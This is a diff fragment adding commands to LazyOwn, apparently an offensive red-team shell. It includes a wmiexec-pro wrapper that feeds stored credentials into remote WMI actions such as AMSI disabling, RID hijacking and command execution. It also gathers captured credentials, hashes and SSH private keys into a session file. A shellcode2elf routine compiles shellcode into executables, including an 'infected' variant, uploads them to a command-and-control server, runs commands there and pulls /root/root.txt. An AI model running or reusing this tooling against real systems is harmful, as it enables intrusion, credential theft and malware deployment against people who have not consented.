+                print_error("No IP address provided. Please provide the IP address of the remote machine without internet access.")
+                return
+
+            proxy_config = f"[global]\nindex-url = http://{self.params['lhost']}:3128/simple"
+            proxy_config_file = "/etc/pip.conf"
+
+            commands = [
+                f"echo '{proxy_config}' | sudo tee {proxy_config_file}",
+                f"pip install --upgrade pip --trusted-host {self.params['lhost']}"
+            ]
+
+            commands_str = "\n".join(commands)
+            copy2clip(commands_str)
+
+            print_msg("pip proxy configured successfully.")
+            print_msg("Commands to configure the remote machine have been copied to the clipboard.")
+
+        except subprocess.CalledProcessError as e:
+            print_error(f"Command failed: {e.cmd}")
+            print_error(f"Output: {e.output}")
+            print_error(f"Return code: {e.returncode}")
+        except Exception as e:
+            print_error(f"An error occurred: {e}")
+
+    def do_internet_proxy(self, line):
+        """
+        Configures the local machine with internet access to act as a proxy for a machine without internet access.
+
+        Steps:
+            1. Installs and configures squid on the local machine.
+            2. Generates the necessary commands to configure the remote machine to use the proxy.
+            3. Copies the commands to the clipboard using the copy2clip function.
+
+        Parameters:
+            line (str): The IP address of the remote machine without internet access.
+
+        Returns:
+            None
+        """
+        try:
+            print_msg("Installing and configuring squid...")
+            subprocess.run(["sudo", "apt-get", "update"], check=True)
+            subprocess.run(["sudo", "apt-get", "install", "-y", "squid"], check=True)
+            subprocess.run(["sudo", "systemctl", "start", "squid"], check=True)
+            subprocess.run(["sudo", "systemctl", "enable", "squid"], check=True)
+
+            if line:
+                remote_ip = line.strip()
+            else:
+                remote_ip = self.params["rhost"]
+
+            if not remote_ip:
+                print_error("No IP address provided. Please provide the IP address of the remote machine without internet access.")
+                return
+
+            squid_config = f"""
+            acl localnet src {remote_ip}
+            http_access allow localnet
+            """
+            squid_config_file = "/etc/squid/squid.conf"
+
+            #with open(squid_config_file, "a") as f:
+            #    f.write(squid_config)
+
+            subprocess.run(["sudo", "systemctl", "restart", "squid"], check=True)
+
+            proxy_ip = self.params["lhost"]
+            proxy_port = 3128
+
+            commands = [
+                f"export http_proxy=http://{proxy_ip}:{proxy_port}",
+                f"export https_proxy=http://{proxy_ip}:{proxy_port}",
+                f"sudo echo 'nameserver {proxy_ip}' >> /etc/resolv.conf"
+            ]
+
+            commands_str = "\n".join(commands)
+            copy2clip(commands_str)
+
+            print_msg("Internet proxy configured successfully.")
+            print_msg("Commands to configure the remote machine have been copied to the clipboard.")
+
+        except subprocess.CalledProcessError as e:
+            print_error(f"Command failed: {e.cmd}")
+            print_error(f"Output: {e.output}")
+            print_error(f"Return code: {e.returncode}")
+        except Exception as e:
+            print_error(f"An error occurred: {e}")
+
+    def do_check_update(self, line):
+        """
+        Checks for updates by comparing the local version with the remote version.
+
+        This function:
+            - Fetches the remote version from a JSON file hosted on GitHub.
+            - Reads the local version from a JSON file in the script's root directory.
+            - Compares the version numbers and determines if an update is needed.
+
+        Behavior:
+            - Requires `requests` library to fetch the remote version.
+            - Uses JSON parsing to extract version numbers.
+
+        Usage:
+            check_update
+        """
+        try:
+            response = requests.get("https://raw.githubusercontent.com/grisuno/LazyOwn/refs/heads/main/version.json")
+            remote_version_data = response.json()
+            remote_version = remote_version_data.get("version", "release/0.0.0").split('/')[-1]
+            if remote_version == "release/0.0.0":
+                print_error("Connect to internet to check updates.")
+                return
+            
+            local_version_path = os.path.join(os.getcwd(), "version.json")
+            with open(local_version_path, 'r') as local_version_file:
+                local_version_data = json.load(local_version_file)
+                local_version = local_version_data.get("version", "release/0.0.0").split('/')[-1]
+            
+            if local_version == "release/0.0.0":
+                print_error("Integrity fail, please reinstall.")
+                return
+            if remote_version > local_version:
+                print_warn("An update is available. Please update to the latest version.")
+                print_msg("Updating")
+                self.onecmd("update")
+            elif remote_version == local_version:
+                print_msg("You are already using the latest version.")
+            else:
+                print_error("Warning: Your local version is newer than the remote version. This should not happen.")
+
+        except Exception as e:
+            print_error(f"An error occurred: {e}")
+
+    def do_wmiexecpro(self, line):
+        """
+        Executes wmiexec-pro with various options for WMI operations.
+
+        This function handles the installation of wmiexec-pro and its dependencies,
+        and allows the user to execute various WMI operations with minimal input.
+        It reads credentials from a specified file and constructs the necessary
+        commands to interact with the target system.
+
+        :param line: Command line input from the user. This input is used to
+                    determine the module and action to be executed.
+        :returns: None
+
+        The function performs the following steps:
+        1. Checks if wmiexec-pro and its dependencies are installed. If not, it
+        installs them in specified directories.
+        2. Reads credentials from a file.
+        3. Constructs and executes the wmiexec-pro command based on user input.
+        4. Enumerates available modules and actions for each module, allowing the
+        user to select them interactively.
+        5. Enumerates available options for each action, allowing the user to select
+        them interactively.
+
+        Example usage:
+        ```
+        do_wmiexecpro("enum -run")
+        ```
+
+        This will execute the enumeration module with the `-run` action.
+
+        If no specific command is provided, the function will prompt the user to
+        select a module and action interactively.
+        """
+        path = os.getcwd()
+        impacket_repo = "https://github.com/fortra/impacket.git"
+        wmiexecpro_repo = "https://github.com/XiaoliChan/wmiexec-Pro.git"
+        impacket_path = os.path.join(path, "external", ".exploit", "impacket")
+        wmiexecpro_path = os.path.join(path, "external", ".exploit", "impacket", "wmiexec-Pro")
+
+        def install_wmiexecpro():
+            try:
+                if not os.path.exists(impacket_path):
+                    print_msg("Impacket is not installed. Installing...")
+                    self.cmd(f"git clone {impacket_repo} {impacket_path}")
+                    self.cmd(f"cd {impacket_path} && sudo pip3 install .")
+
+                if not os.path.exists(wmiexecpro_path):
+                    print_msg("wmiexec-pro is not installed. Installing...")
+                    self.cmd(f"git clone {wmiexecpro_repo} {wmiexecpro_path}")
+
+                print_msg("Installation completed.")
+            except Exception as e:
+                print_error(f"An error occurred during installation: {e}")
+
+        if not is_binary_present("wmiexec-pro.py"):
+            install_wmiexecpro()
+
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+
+        path_cred = get_credentials(True)
+
+        if not os.path.exists(path_cred):
+            print_error("Credentials file not found. Please ensure the credentials file exists.")
+            return
+
+        with open(path_cred, "r") as file:
+            for file_line in file:
+                params = file_line.split(":")
+                username = params[0]
+                password = params[1].replace("\n", "")
+
+                if line:
+                    command_parts = line.split()
+                    module = command_parts[0]
+                    action = command_parts[1] if len(command_parts) > 1 else ""
+                    options = command_parts[2:]
+
+                    command = f"python3 {wmiexecpro_path}/wmiexec-pro.py {domain}\\{username}:{password}@{rhost} {module}"
+
+                    if action:
+                        command += f" {action}"
+
+                    if options:
+                        command += " " + " ".join(options)
+
+                    self.cmd(command)
+                    return
+
+                print_warn("Select the module you want to use:")
+                modules = [
+                    "enum", "amsi", "exec-command", "filetransfer", "rdp", "winrm",
+                    "firewall", "service", "eventlog", "rid-hijack"
+                ]
+                for i, module in enumerate(modules, start=1):
+                    print_msg(f"{i}. {module}")
+
+                try:
+                    module_choice = int(input("    [!] Enter the number corresponding to the module: ")) - 1
+                    if module_choice < 0 or module_choice >= len(modules):
+                        print_error("Invalid choice. Please select a valid number.")
+                        return
+
+                    module = modules[module_choice]
+                    actions = {
+                        "enum": ["-run"],
+                        "amsi": ["-enable", "-disable"],
+                        "exec-command": ["-shell", "-command", "-silent", "-old", "-save", "-clear"],
+                        "filetransfer": ["-upload", "-download", "-clear"],
+                        "rdp": ["-enable", "-enable-old", "-enable-ram", "-disable", "-disable-old", "-disable-ram"],
+                        "winrm": ["-enable", "-disable"],
+                        "firewall": ["-search-port", "-dump", "-rule-id", "-firewall-profile"],
+                        "service": ["-action", "-dump"],
+                        "eventlog": ["-risk-i-know", "-retrive"],
+                        "rid-hijack": ["-user", "-action", "-hijack-rid", "-blank-pass-login", "-remove", "-restore"]
+                    }
+
+                    print_warn(f"Select the action for {module}:")
+                    for j, action in enumerate(actions[module], start=1):
+                        print_msg(f"{j}. {action}")
+
+                    action_choice = int(input("    [!] Enter the number corresponding to the action: ")) - 1
+                    if action_choice < 0 or action_choice >= len(actions[module]):
+                        print_error("Invalid choice. Please select a valid number.")
+                        return
+
+                    action = actions[module][action_choice]
+
+                    options_dict = {
+                        "enum": {
+                            "-run": []
+                        },
+                        "amsi": {
+                            "-enable": [],
+                            "-disable": []
+                        },
+                        "exec-command": {
+                            "-shell": [],
+                            "-command": ["-command", "-silent", "-old", "-save"],
+                            "-silent": [],
+                            "-old": [],
+                            "-save": [],
+                            "-clear": []
+                        },
+                        "filetransfer": {
+                            "-upload": ["-src-file", "-dest-file"],
+                            "-download": ["-src-file", "-dest-file"],
+                            "-clear": []
+                        },
+                        "rdp": {
+                            "-enable": [],
+                            "-enable-old": [],
+                            "-enable-ram": [],
+                            "-disable": [],
+                            "-disable-old": [],
+                            "-disable-ram": []
+                        },
+                        "winrm": {
+                            "-enable": [],
+                            "-disable": []
+                        },
+                        "firewall": {
+                            "-search-port": ["-port"],
+                            "-dump": [],
+                            "-rule-id": ["-action"],
+                            "-firewall-profile": ["-action"]
+                        },
+                        "service": {
+                            "-action": ["-service-name", "-display-name", "-bin-path", "-class"],
+                            "-dump": []
+                        },
+                        "eventlog": {
+                            "-risk-i-know": [],
+                            "-retrive": ["-object-ID"]
+                        },
+                        "rid-hijack": {
+                            "-user": ["-action", "-hijack-rid"],
+                            "-action": ["-user"],
+                            "-hijack-rid": ["-user"],
+                            "-blank-pass-login": ["-enable", "-disable"],
+                            "-remove": ["-user"],
+                            "-restore": ["-backup-file"]
+                        }
+                    }
+
+                    options = []
+                    if options_dict[module][action]:
+                        print_warn(f"Select the options for {action}:")
+                        for k, option in enumerate(options_dict[module][action], start=1):
+                            print_msg(f"{k}. {option}")
+
+                        while True:
+                            try:
+                                option_choice = int(input("    [!] Enter the number corresponding to the option (or 0 to finish): ")) - 1
+                                if option_choice == -1:
+                                    break
+                                if option_choice < 0 or option_choice >= len(options_dict[module][action]):
+                                    print_error("Invalid choice. Please select a valid number.")
+                                    continue
+                                option_value = input(f"    [!] Enter the value for {options_dict[module][action][option_choice]}: ").strip()
+                                options.append(f"{options_dict[module][action][option_choice]} {option_value}")
+                            except ValueError:
+                                print_error("Invalid input. Please enter a valid number.")
+
+                    command = f"python3 {wmiexecpro_path}/wmiexec-pro.py {domain}\\{username}:{password}@{rhost} {module} {action}"
+                    if options:
+                        command += " " + " ".join(options)
+
+                    print_msg(f"Running wmiexec-pro with command: {command}")
+                    self.cmd(command)
+
+                except ValueError:
+                    print_error("Invalid input. Please enter a valid number.")
+                return
+
+    def do_create_session_json(self, line):
+        """
+        Generates or updates a JSON file to be used as a database.
+
+        The JSON file will be named `sessionLazyOwn_{timestamp}.json` and will be stored
+        in the `sessions` directory. The JSON file will contain data from `self.params`
+        and additional data extracted from `credentials*.txt` and `hash*.txt` files.
+
+        The structure of the JSON file will be as follows:
+        - `params`: Data from `self.params`.
+        - `credentials`: A list of dictionaries containing usernames and passwords extracted
+        from `credentials*.txt` files.
+        - `hashes`: A list of dictionaries containing the contents of `hash*.txt` files.
+        - `notes`: The content of the `notes.txt` file, if it exists.
+
+        Returns:
+            None
+        """
+        path = os.getcwd()
+        sessions = f"{path}/sessions"
+        timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
+        session_file = os.path.join(sessions, f'sessionLazyOwn.json')
+        session_data = {
+            "params": self.params,
+            "credentials": [],
+            "hashes": [],
+            "timestamp": timestamp,
+            "notes": None,
+            "id_rsa": []
+        }
+        credentials_files = glob.glob(os.path.join(sessions, 'credentials*.txt'))
+        for i, file in enumerate(credentials_files, start=1):
+            with open(file, 'r') as f:
+                line = f.readline().strip()
+                if line:
+                    username, password = line.split(':')
+                    session_data["credentials"].append({
+                        "usuario": i,
+                        "username": username,
+                        "contraseña": password
+                    })
+        hash_files = glob.glob(os.path.join(sessions, 'hash*.txt'))
+        for i, file in enumerate(hash_files, start=1):
+            with open(file, 'r') as f:
+                content = f.read().strip()
+                session_data["hashes"].append({
+                    "hash": i,
+                    "content": content
+                })
+        notes_file = os.path.join(sessions, 'notes.txt')
+        if os.path.exists(notes_file):
+            with open(notes_file, 'r') as f:
+                session_data["notes"] = f.read().strip()
+        id_rsa_files = glob.glob(os.path.join(sessions, 'id_rsa*'))
+        for file in id_rsa_files:
+            with open(file, 'r') as f:
+                session_data["id_rsa"].append(f.read().strip())
+        with open(session_file, 'w') as f:
+            json.dump(session_data, f, indent=4)
+
+    def do_shellcode2elf(self, line):
+        """
+        Convert shellcode into an ELF file and infect it.
+
+        This function takes an optional input line that specifies the name of the shellcode file.
+        If no input line is provided, a filename is generated based on the domain. The function reads
+        the shellcode and inserts it into a C source file, then compiles the source file into an ELF
+        file. It also creates an infected version of the ELF file and uploads all generated files to a
+        command and control (C2) server.
+
+        Args:
+            line (str): An optional input line that specifies the name of the shellcode file.
+
+        Returns:
+            None
+        """
+        domain = self.params["domain"]
+        if line:
+            name = line.strip()
+            nameinfect = "infect_" + line.strip()
+        else:
+            name = f"shellcode_{domain}.c"
+            nameinfect = f"infect_shellcode_{domain}.c"
+
+        path = os.getcwd()
+        shellcode = get_users_dic("c")
+        name_shell = "shell.c"
+        name_shell_inf = "infect.c"
+        sessions = f"{path}/sessions"
+        infect_pid = f"{sessions}/{name_shell_inf}"
+        pid = "pid.c"
+        pid_pid = f"{sessions}/{pid}"
+        shellsrc = f"{sessions}/{name}"
+        shell = f"{sessions}/{name_shell}"
+        elf = f"{sessions}/{name.replace(".c","")}"
+        final_infect = f"{sessions}/{nameinfect}"
+        with open(shellcode, 'r') as f:
+            content_shellcode = f.read().strip()
+            
+        with open(shell, 'r') as f:
+            content_c = f.read().strip()
+ 
+            content_c = content_c.replace("{shellcode}", content_shellcode)
+     
+
+        with open(infect_pid, 'r') as f:
+            infect = f.read().strip()
+            infect = infect.replace("{shellcode}", content_shellcode)
+
+        with open(shellsrc, 'w') as f:
+            f.write(content_c)
+        with open(final_infect, 'w') as f:
+            f.write(infect)
+
+        command = f"gcc -o {elf} {shellsrc} -fno-stack-protector -z execstack"
+        command_infect = f"gcc -o {elf}_infect {final_infect} -fno-stack-protector -z execstack"
+
+        self.cmd(command)
+        self.cmd(command_infect)
+
+        self.cmd(f"gcc -o pid {pid_pid}")
+
+        self.upload_file_to_c2(shellsrc)
+        self.upload_file_to_c2(final_infect)
+        self.upload_file_to_c2(elf)
+        self.upload_file_to_c2(f"{elf}_infect")
+
+        command = f"gcc -o {elf.replace(f"{sessions}/","")} {shellsrc.replace(f"{sessions}/","")} -fno-stack-protector -z execstack"
+        command_infect = f"gcc -o {elf.replace(f"{sessions}/","")}_infect {final_infect.replace(f"{sessions}/","")} -fno-stack-protector -z execstack"
+
+        self.issue_command_to_c2(command)
+        self.issue_command_to_c2(command_infect)
+
+        self.download_file_from_c2("/root/root.txt")
+
+        copy2clip(command)
+        return
+    
 if __name__ == "__main__":
     p = LazyOwnShell()
+    p.onecmd("check_update")
     p.onecmd("graph")
     old = False
     if arguments:
@@ -21542,4 +22769,5 @@ if __name__ == "__main__":
         p.onecmd("rhost clean")    
     p.onecmd('p')
     p.onecmd('ipp')
+    p.onecmd("create_session_json")
     p.cmdloop()
